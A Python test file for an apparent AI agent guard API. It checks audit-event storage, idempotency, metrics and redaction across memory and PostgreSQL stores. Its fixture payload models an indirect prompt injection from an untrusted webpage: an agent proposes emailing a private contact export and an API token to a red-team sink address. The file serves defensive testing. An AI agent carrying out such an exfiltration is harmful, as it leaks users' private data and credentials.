"""Cross-store contract tests for AuditEvent 0.4 writer semantics (§8-§12, §19, §21).

Memory 与 PostgreSQL store 必须运行相同的幂等与指标契约测试（§25.2）。
"""

from __future__ import annotations

import json
from pathlib import Path
from uuid import uuid4

import pytest
from fastapi.testclient import TestClient

from agentguard_core import AuditEvent, GuardDecision, GuardEvent, PolicyBundle
from guard_api.main import create_app
from guard_api.services import PolicyService
from guard_api.services.evidence import build_audit_event
from guard_api.services.metric_rules import classify_record_type
from guard_api.services.redaction import (
    MAX_EVIDENCE_BYTES,
    evidence_serialized_size,
)
from guard_api.settings import GuardApiSettings
from guard_api.storage.base import (
    AuditEventFilters,
    AuditIdConflictError,
    EvalMetricFilters,
)
from guard_api.storage.integrity import canonical_sha256
from guard_api.storage.memory import MemoryControlPlaneStore
from guard_api.storage.postgres import PostgresControlPlaneStore
from tests.support.postgres import get_test_database_url, reset_control_plane_schema

FIXTURE_PATH = Path(__file__).parent / "fixtures" / "runtime_safety_trace_v04.json"

ADAPTER_HEADERS = {"Authorization": "Bearer adapter-secret"}

_STABLE_LINK_KEYS = {
    "event_id",
    "decision_id",
    "action_id",
    "approval_id",
    "critic_review_id",
    "memory_change_id",
}


def _settings() -> GuardApiSettings:
    return GuardApiSettings(adapter_token="adapter-secret", control_token="control-secret")


@pytest.fixture(params=["memory", "postgres"])
def store(request):
    if request.param == "memory":
        return MemoryControlPlaneStore()
    database_url = get_test_database_url()
    reset_control_plane_schema(database_url)
    postgres_store = PostgresControlPlaneStore(database_url)
    postgres_store.initialize()
    return postgres_store


@pytest.fixture()
def client(store):
    return TestClient(create_app(store=store, settings=_settings()))


def _guard_event_payload(*, event_id: str, trace_id: str, arguments: dict | None = None) -> dict:
    return {
        "schema_version": "0.3",
        "event_id": event_id,
        "event_type": "tool_call_proposed",
        "runtime": "langgraph",
        "trace_id": trace_id,
        "case_id": "CASE-CONTRACT",
        "attack_type": "indirect_prompt_injection",
        "is_malicious": True,
        "timestamp": "2026-06-11T00:00:00+00:00",
        "pre_execution": True,
        "security_context": {
            "user_task": "Complete the visible web form only",
            "source_type": "webpage",
            "source_trust": "untrusted",
        },
        "payload": {
            "tool": {
                "name": "send_email",
                "category": "message",
                "kind": "email_send",
                "call_id": f"call_{event_id}",
            },
            "arguments": arguments
            or {
                "to": "sink@red-team.agentguard.local",
                "subject": "contact export",
                "body": "private contact export",
                "api_token": "sk-live-contract-test",
            },
            "derived_resources": [],
        },
        "metadata": {},
    }


def _post_evaluate(client: TestClient, payload: dict):
    return client.post("/v1/guard/evaluate", headers=ADAPTER_HEADERS, json=payload)


def _stored_policy_audit(store, trace_id: str) -> AuditEvent:
    events = store.list_audit_events(AuditEventFilters(trace_id=trace_id))
    assert len(events) == 1
    return events[0]


def test_contract_evaluation_writes_04_policy_evaluation_shape(store, client) -> None:
    run_id = uuid4().hex
    trace_id = f"trace_contract_shape_{run_id}"
    bundle = PolicyBundle(disabled_rules=["P001_sensitive_file_access"])
    PolicyService(store=store).save_snapshot(bundle, updated_by="contract-test")

    response = _post_evaluate(
        client, _guard_event_payload(event_id=f"evt_shape_{run_id}", trace_id=trace_id)
    )

    assert response.status_code == 200
    audit = _stored_policy_audit(store, trace_id)

    assert audit.schema_version == "0.4"
    assert audit.record_type == "policy_evaluation"
    evidence = audit.evidence
    assert isinstance(evidence, dict)
    assert set(evidence) == {
        "guard_event",
        "guard_decision",
        "policy",
        "intervention",
        "execution",
        "side_effects",
        "result",
        "approval",
    }
    # §9.3：policy 块与实际保存的快照一致。
    assert evidence["policy"] == {
        "bundle_id": bundle.bundle_id,
        "version": bundle.version,
        "revision": 1,
        "canonical_digest": canonical_sha256(bundle.model_dump(mode="json")),
        "canonicalization": "json:sorted-keys:v1",
    }
    # §9.9：links 只保留稳定 ID；digest 移入 metadata。
    assert set(audit.links) <= _STABLE_LINK_KEYS
    assert audit.links["event_id"] == f"evt_shape_{run_id}"
    assert "decision_id" in audit.links
    assert audit.metadata["request_digest"] == canonical_sha256(
        GuardEvent.model_validate(
            _guard_event_payload(event_id=f"evt_shape_{run_id}", trace_id=trace_id)
        ).model_dump(mode="json")
    )
    assert audit.metadata["policy_digest"] == evidence["policy"]["canonical_digest"]
    assert "policy_source" not in audit.metadata
    # tool.arguments 必须服务端脱敏（§21.1）。
    arguments = evidence["guard_event"]["tool"]["arguments"]
    assert arguments["api_token"] == "[redacted]"
    assert evidence["approval"]["status"] in {"pending", "not_required"}


def test_contract_replay_same_event_returns_original_decision(store, client) -> None:
    run_id = uuid4().hex
    payload = _guard_event_payload(
        event_id=f"evt_replay_{run_id}", trace_id=f"trace_replay_{run_id}"
    )

    first = _post_evaluate(client, payload)
    second = _post_evaluate(client, payload)

    assert first.status_code == 200
    assert second.status_code == 200
    assert (
        second.json()["decision"]["decision_id"]
        == first.json()["decision"]["decision_id"]
    )
    events = store.list_audit_events(
        AuditEventFilters(trace_id=f"trace_replay_{run_id}")
    )
    assert len(events) == 1


def test_contract_different_content_same_event_id_conflicts(store, client) -> None:
    run_id = uuid4().hex
    event_id = f"evt_conflict_{run_id}"
    trace_id = f"trace_conflict_{run_id}"

    first = _post_evaluate(client, _guard_event_payload(event_id=event_id, trace_id=trace_id))
    second = _post_evaluate(
        client,
        _guard_event_payload(
            event_id=event_id,
            trace_id=trace_id,
            arguments={"to": "other@red-team.agentguard.local"},
        ),
    )

    assert first.status_code == 200
    assert second.status_code == 409
    assert second.json()["error"]["code"] == "EVALUATION_CONFLICT"
    assert (
        len(store.list_audit_events(AuditEventFilters(trace_id=trace_id))) == 1
    )


def _policy_audit_for_idempotency(run_id: str) -> AuditEvent:
    event = GuardEvent.model_validate(
        _guard_event_payload(event_id=f"evt_auditidem_{run_id}", trace_id=f"trace_auditidem_{run_id}")
    )
    decision = GuardDecision(
        decision_id=f"dec_auditidem_{run_id}",
        decision="deny",
        risk_score=90,
        severity="critical",
        categories=["external_exfiltration"],
        rule_hits=[],
        reason="Blocked by contract test.",
        safe_message=None,
        approval_intent=None,
        latency_ms=1,
    )
    return build_audit_event(
        event,
        decision,
        policy_bundle=PolicyBundle(),
        policy_revision=None,
    )


def test_contract_audit_id_same_content_does_not_extend_chain(store) -> None:
    audit = _policy_audit_for_idempotency(uuid4().hex)

    first = store.add_audit_event(audit)
    second = store.add_audit_event(audit.model_copy(deep=True))

    assert first is True
    assert second is False
    events = store.list_audit_events(AuditEventFilters(trace_id=audit.trace_id))
    assert len(events) == 1
    assert store.verify_audit_integrity().valid


def test_contract_audit_id_different_content_raises_conflict(store) -> None:
    run_id = uuid4().hex
    original = _policy_audit_for_idempotency(run_id)
    store.add_audit_event(original)

    different = original.model_copy(update={"decision": "allow", "blocked": False})

    with pytest.raises(AuditIdConflictError):
        store.add_audit_event(different)

    assert (
        len(store.list_audit_events(AuditEventFilters(trace_id=original.trace_id)))
        == 1
    )


def test_contract_duplicate_policy_audits_counted_once(store) -> None:
    run_id = uuid4().hex
    trace_id = f"trace_dedupe_{run_id}"
    links = {
        "event_id": f"evt_dedupe_{run_id}",
        "decision_id": f"dec_dedupe_{run_id}",
    }
    for index in range(2):
        store.add_audit_event(
            AuditEvent(
                audit_id=f"audit_dedupe_{run_id}_{index}",
                schema_version="0.4",
                record_type="policy_evaluation",
                trace_id=trace_id,
                event_type="tool_call_proposed",
                summary=f"Duplicate policy audit {index}",
                decision="ask",
                risk_score=70,
                severity="high",
                blocked=True,
                reason="Contract dedupe test.",
                links=dict(links),
            )
        )

    metrics = store.eval_metrics(EvalMetricFilters(trace_id=trace_id))

    # §19.1：重复逻辑键只保留最早入链记录。
    assert metrics["event_count"] == 1
    assert metrics["ask_count"] == 1
    assert metrics["blocked_count"] == 1


def test_contract_legacy_03_records_classified_per_19_2(store) -> None:
    run_id = uuid4().hex
    trace_id = f"trace_classify_{run_id}"
    legacy = [
        ("config_audit", f"audit_cfg_{run_id}"),
        ("runtime_observation", f"audit_obs_{run_id}"),
        ("tool_call_proposed", f"audit_policy_{run_id}"),
    ]
    for event_type, audit_id in legacy:
        store.add_audit_event(
            AuditEvent(
                audit_id=audit_id,
                schema_version="0.3",
                trace_id=trace_id,
                event_type=event_type,
                summary=f"Legacy {event_type}",
                decision="allow",
                risk_score=0,
                severity="low",
                blocked=False,
                reason="Legacy record.",
                links={},
            )
        )

    events = store.list_audit_events(AuditEventFilters(trace_id=trace_id))
    classified = {event.audit_id: classify_record_type(event) for event in events}
    assert classified == {
        f"audit_cfg_{run_id}": "config_audit",
        f"audit_obs_{run_id}": "runtime_observation",
        f"audit_policy_{run_id}": "policy_evaluation",
    }
    # 只有被分类为 policy_evaluation 的旧记录进入策略指标。
    metrics = store.eval_metrics(EvalMetricFilters(trace_id=trace_id))
    assert metrics["event_count"] == 1
    assert metrics["allow_count"] == 1

    fixture = json.loads(FIXTURE_PATH.read_text(encoding="utf-8"))
    fixture_types = {
        audit["record_type"]
        for audit in fixture["source_facts"]["audit_events"]
    }
    assert fixture_types == {
        "policy_evaluation",
        "runtime_outcome",
        "runtime_observation",
    }
    fixture_policy = next(
        audit
        for audit in fixture["source_facts"]["audit_events"]
        if audit["record_type"] == "policy_evaluation"
    )
    # 对照 fixture：policy_evaluation evidence 必须包含全部契约块。
    policy_audit = next(
        event
        for event in events
        if event.audit_id == f"audit_policy_{run_id}"
    )
    assert classify_record_type(policy_audit) == fixture_policy["record_type"]


def test_contract_evidence_serialized_within_64kib() -> None:
    event = GuardEvent.model_validate(
        _guard_event_payload(
            event_id="evt_budget",
            trace_id="trace_budget",
            arguments={"blob": "x" * 50_000},
        )
    )
    decision = GuardDecision(
        decision_id="dec_budget",
        decision="ask",
        risk_score=80,
        severity="high",
        categories=["external_exfiltration"],
        rule_hits=[],
        reason="Budget test." * 2000,
        safe_message=None,
        approval_intent=None,
        latency_ms=1,
    )

    audit = build_audit_event(
        event,
        decision,
        policy_bundle=PolicyBundle(),
        policy_revision=None,
    )

    # §21.2：超限截断投影，不拒绝写入。
    assert evidence_serialized_size(audit.evidence) <= MAX_EVIDENCE_BYTES
    # 预算收缩后关键块仍完整存在，不被截断为占位符。
    policy = audit.evidence["policy"]
    assert policy["canonical_digest"].startswith("sha256:")
    assert audit.evidence["approval"]["status"] in {"pending", "not_required"}
    assert audit.evidence["guard_decision"]["decision_id"] == "dec_budget"


def test_contract_03_inbound_stored_verbatim_and_excluded_from_policy_metrics(store) -> None:
    # 0.3 历史记录原样入链（不改写 schema_version、不推断 record_type），
    # 且按 §19.2 分类后不进入策略指标。
    run_id = uuid4().hex
    trace_id = f"trace_inbound03_{run_id}"
    store.add_audit_event(
        AuditEvent(
            audit_id=f"audit_inbound03_{run_id}",
            schema_version="0.3",
            trace_id=trace_id,
            event_type="runtime_observation",
            summary="Legacy inbound observation",
            decision="allow",
            risk_score=0,
            severity="low",
            blocked=False,
            reason="Inbound 0.3 record.",
            links={},
        )
    )

    events = store.list_audit_events(AuditEventFilters(trace_id=trace_id))
    assert len(events) == 1
    assert events[0].schema_version == "0.3"
    assert events[0].record_type is None
    metrics = store.eval_metrics(EvalMetricFilters(trace_id=trace_id))
    assert metrics["event_count"] == 0


def test_contract_legacy_shape_record_replays_via_fallback_reads(store, client) -> None:
    # PR #92/#93 旧形态：digest 在 links、decision dump 在 metadata。
    run_id = uuid4().hex
    event_id = f"evt_legacyshape_{run_id}"
    trace_id = f"trace_legacyshape_{run_id}"
    payload = _guard_event_payload(event_id=event_id, trace_id=trace_id)
    decision = GuardDecision(
        decision_id=f"dec_legacyshape_{run_id}",
        decision="allow",
        risk_score=0,
        severity="low",
        categories=[],
        rule_hits=[],
        reason="Legacy replay.",
        safe_message=None,
        approval_intent=None,
        latency_ms=1,
    )
    legacy_audit = AuditEvent(
        audit_id=f"audit_legacyshape_{run_id}",
        schema_version="0.3",
        trace_id=trace_id,
        event_type="tool_call_proposed",
        summary="Legacy shape audit",
        decision="allow",
        risk_score=0,
        severity="low",
        blocked=False,
        reason="Legacy shape.",
        links={
            "event_id": event_id,
            "decision_id": decision.decision_id,
            "request_digest": canonical_sha256(
                GuardEvent.model_validate(payload).model_dump(mode="json")
            ),
        },
        metadata={"guard_decision": decision.model_dump(mode="json")},
    )
    store.add_audit_event(legacy_audit)

    response = _post_evaluate(client, payload)

    assert response.status_code == 200
    assert response.json()["decision"]["decision_id"] == decision.decision_id
    assert (
        len(store.list_audit_events(AuditEventFilters(trace_id=trace_id))) == 1
    )
